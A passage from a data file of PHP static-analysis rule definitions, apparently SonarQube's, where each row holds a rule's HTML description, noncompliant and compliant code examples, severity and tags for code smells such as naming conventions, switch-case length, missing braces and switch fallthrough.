define(""const1"", true);

class Foo {
    const const2 = ""bar"";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
define(""CONST1"", true);

class Foo {
    const CONST2 = ""bar"";
}
</pre>",Constant names should comply with a naming convention,"[{'key': 'format', 'defaultValue': '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$', 'type': 'STRING'}]",CRITICAL,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
switch ($var) {
  case 0:  // 6 lines till next case
    methodCall1();
    methodCall2();
    methodCall3();
    methodCall4();
    break;
  default:
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($var) {
  case 0:
    doSomething();
    break;
  default:
    break;
}

function doSomething(){
  methodCall1("""");
  methodCall2("""");
  methodCall3("""");
  methodCall4("""");
}
</pre>",php:S1151,php,PHP,"<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
switch ($var) {
  case 0:  // 6 lines till next case
    methodCall1();
    methodCall2();
    methodCall3();
    methodCall4();
    break;
  default:
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($var) {
  case 0:
    doSomething();
    break;
  default:
    break;
}

function doSomething(){
  methodCall1("""");
  methodCall2("""");
  methodCall3("""");
  methodCall4("""");
}
</pre>","""switch case"" clauses should not have too many lines of code","[{'key': 'max', 'htmlDesc': 'Maximum number of lines of code', 'defaultValue': '10', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  $my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  $myField;
}
</pre>",php:S116,php,PHP,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  $my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  $myField;
}
</pre>",Field names should comply with a naming convention,"[{'key': 'format', 'defaultValue': '^[a-z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public function doSomething($my_param){
  $LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function doSomething($myParam){
  $local;
  ...
}
</pre>",php:S117,php,PHP,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public function doSomething($my_param){
  $LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function doSomething($myParam){
  $local;
  ...
}
</pre>",Local variable and function parameter names should comply with a naming convention,"[{'key': 'format', 'defaultValue': '^[a-z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething($a, $b) { // ""$a"" is unused
  return compute($b);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($b) {
  return compute($b);
}
</pre>
<h2>Exceptions</h2>
<p>Functions in classes that override a class or implement interfaces are ignored.</p>
<pre>
class C extends B {

  function doSomething($a, $b) {     // no issue reported on $b
    compute($a);
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",php:S1172,php,PHP,"<p>Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething($a, $b) { // ""$a"" is unused
  return compute($b);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($b) {
  return compute($b);
}
</pre>
<h2>Exceptions</h2>
<p>Functions in classes that override a class or implement interfaces are ignored.</p>
<pre>
class C extends B {

  function doSomething($a, $b) {     // no issue reported on $b
    compute($a);
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused function parameters should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2014-11-21T07:03:47+0100,"<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);  // Noncompliant
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);
    // do additional things...
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<p>or</p>
<pre>
class Child extends Parent {
  // function eliminated
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>",php:S1185,php,PHP,"<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);  // Noncompliant
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);
    // do additional things...
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<p>or</p>
<pre>
class Child extends Parent {
  // function eliminated
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>",Overriding methods should do more than simply call the same method in the super class,[],MINOR,"['clumsy', 'redundant']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function run() {
  prepare('action1');                              // Non-Compliant - 'action1' is duplicated 3 times
  execute('action1');
  release('action1');
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ACTION_1 = 'action1';

function run() {
  prepare(ACTION_1);
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>",php:S1192,php,PHP,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function run() {
  prepare('action1');                              // Non-Compliant - 'action1' is duplicated 3 times
  execute('action1');
  release('action1');
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ACTION_1 = 'action1';

function run() {
  prepare(ACTION_1);
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>",String literals should not be duplicated,"[{'key': 'threshold', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['design'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book ""Principles of Object Oriented Design"", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  class Foo {            // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
    /**
     * @var T1
     */
    public $a1;          // Foo is coupled to T1
    /**
     * @var T2
     */
    protected $a2;       // Foo is coupled to T2
    /**
     * @var T3
     */
    private $a3;         // Foo is coupled to T3

    /**
     * @param T5
     * @param T6
     *
     * @return T4
     */
    public function compute(T5 $a, $b) { // Foo is coupled to T4, T5 and T6
      $result = new T7();     // Foo is coupled to T7
      return $result;
  }
}
</pre>",php:S1200,php,PHP,"<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book ""Principles of Object Oriented Design"", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  class Foo {            // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
    /**
     * @var T1
     */
    public $a1;          // Foo is coupled to T1
    /**
     * @var T2
     */
    protected $a2;       // Foo is coupled to T2
    /**
     * @var T3
     */
    private $a3;         // Foo is coupled to T3

    /**
     * @param T5
     * @param T6
     *
     * @return T4
     */
    public function compute(T5 $a, $b) { // Foo is coupled to T4, T5 and T6
      $result = new T7();     // Foo is coupled to T7
      return $result;
  }
}
</pre>",Classes should not be coupled to too many other classes (Single Responsibility Principle),"[{'key': 'max', 'defaultValue': '20', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",php:S121,php,PHP,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",Control structures should use curly braces,[],CRITICAL,"['cert', 'misra', 'pitfall']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored.</p>
<pre>
$max_comparator = function ($v) { return $v &gt; 2; };           // Compliant
$max_comparator = function ($v) { echo $v; return $v &gt; 2; };  // Noncompliant
</pre>",php:S122,php,PHP,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored.</p>
<pre>
$max_comparator = function ($v) { return $v &gt; 2; };           // Compliant
$max_comparator = function ($v) { echo $v; return $v &gt; 2; };  // Noncompliant
</pre>",Statements should be on separate lines,[],MAJOR,"['psr2', 'style']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",php:S125,php,PHP,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",Sections of code should not be commented out,[],MAJOR,"['misra', 'unused']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
} else {
  throw new InvalidArgumentException('message');
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",php:S126,php,PHP,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
} else {
  throw new InvalidArgumentException('message');
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""if ... else if"" constructs should end with ""else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>",php:S1264,php,PHP,"<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>","A ""while"" loop should be used instead of a ""for"" loop",[],MINOR,['clumsy'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
  if(condition) {
    $i = 20;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
}

</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.6 - Numeric variables being used within a <em>for</em> loop for iteration counting shall not be modified in the body of the
  loop. </li>
  <li> MISRA C++:2008, 6-5-3 - The <em>loop-counter</em> shall not be modified within <em>condition</em> or <em>statement</em>. </li>
</ul>",php:S127,php,PHP,"<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
  if(condition) {
    $i = 20;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
}

</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.6 - Numeric variables being used within a <em>for</em> loop for iteration counting shall not be modified in the body of the
  loop. </li>
  <li> MISRA C++:2008, 6-5-3 - The <em>loop-counter</em> shall not be modified within <em>condition</em> or <em>statement</em>. </li>
</ul>","""for"" loop stop conditions should be invariant",[],MAJOR,"['misra', 'pitfall']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    do_something();
  default:
    do_something_else();
   break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:
    do_something();
    break;
  default:
    do_something_else();
   break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in following cases:</p>
<pre>
switch ($myVariable) {
  case 0:                  // Empty case used to specify the same behavior for a group of cases.
  case 1:
    do_something();
    break;
  case 2:                  // Use of continue statement
    continue;
  case 3:                  // Case includes a jump statement (exit, return, break &amp;etc)
    exit(0);
  case 4:
    echo 'Second case, which falls through';
    // no break        &lt;- comment is used when fall-through is intentional in a non-empty case body
  default:                 // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>",php:S128,php,PHP,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    do_something();
  default:
    do_something_else();
   break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:
    do_something();
    break;
  default:
    do_something_else();
   break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in following cases:</p>
<pre>
switch ($myVariable) {
  case 0:                  // Empty case used to specify the same behavior for a group of cases.
  case 1:
    do_something();
    break;
  case 2:                  // Use of continue statement
    continue;
  case 3:                  // Case includes a jump statement (exit, return, break &amp;etc)
    exit(0);
  case 4:
    echo 'Second case, which falls through';
    // no break        &lt;- comment is used when fall-through is intentional in a non-empty case body
  default:                 // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>","Switch cases should end with an unconditional ""break"" statement",[],BLOCKER,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($variable) {
  case 0:
    do_something();
    break;
  default:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($variable == 0) {
  do_something();
} else {
  do_something_else();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>",php:S1301,php,PHP,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($variable) {
  case 0:
    do_something();
    break;
  default:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($variable == 0) {
  do_something();
} else {
  do_something_else();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>","""switch"" statements should have at least 3 ""case"" clauses",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>The requirement for a final <code>case default</code> clause is defensive programming. The clause should either take appropriate action, or contain
a suitable comment as to why no action is taken. Even when the <code>switch</code> covers all current values of an <code>enum</code>, a default case
should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($param) {  //missing default clause
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($param) {
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>",php:S131,php,PHP,"<p>The requirement for a final <code>case default</code> clause is defensive programming. The clause should either take appropriate action, or contain
a suitable comment as to why no action is taken. Even when the <code>switch</code> covers all current values of an <code>enum</code>, a default case
should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($param) {  //missing default clause
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($param) {
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
